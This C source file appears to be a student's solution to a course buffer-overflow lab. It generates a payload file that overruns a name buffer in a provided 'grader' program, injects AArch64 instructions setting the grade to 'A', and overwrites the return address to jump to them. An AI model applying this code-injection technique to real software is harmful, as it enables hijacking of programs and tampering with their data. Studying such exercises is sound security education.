/* Produces a file called dataA with the student name, a nullbyte,
   some padding, some instructions that set the grade variable equal to
   the character A, and an instruction that branches back to
   the second to last printf call in the grader executable. The end
   of the dataA file also contains a return address that points to
   where our injected instructions live in the BSS. */
#include <stdio.h>
#include "miniassembler.h"

/* Prints a buffer overun string to the file dataA that causes the
grader executable to give a grade A to the name Ibraheem Amin. This
function takes in no command line arguments, returns 0 */
int main()
{
    FILE *psFile;
    int i;
    unsigned long ulACodeAddress = 0x42006c;
    unsigned int curInstruction;
    psFile = fopen("dataA", "w");

    /* Name */
    fprintf(psFile, "%s", "Ibraheem Amin");
    /* Nullbyte at the end of the name */
    putc(0, psFile);
    /* Nullbytes for padding */
    for (i = 0; i < 6; i++)
    {
        putc(0, psFile);
    }
    /* mov w0, 'A' */
    curInstruction = MiniAssembler_mov(0, 0x41);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* adr x1, grade */
    curInstruction = MiniAssembler_adr(1, 0x420044, 0x420070);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* strb w0, x1 */
    curInstruction = MiniAssembler_strb(0, 1);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* Branch back to the second to last printf in main of grader */
    curInstruction = MiniAssembler_b(0x40089c, 0x420078);
    (void)fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);

    /* Filler nullbytes */
    for (i = 0; i < 12; i++)
    {
        putc(0, psFile);
    }

    /* Address for our code to overwrite grade which overwrites the
       return address of getName() */
    (void)fwrite(&ulACodeAddress, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}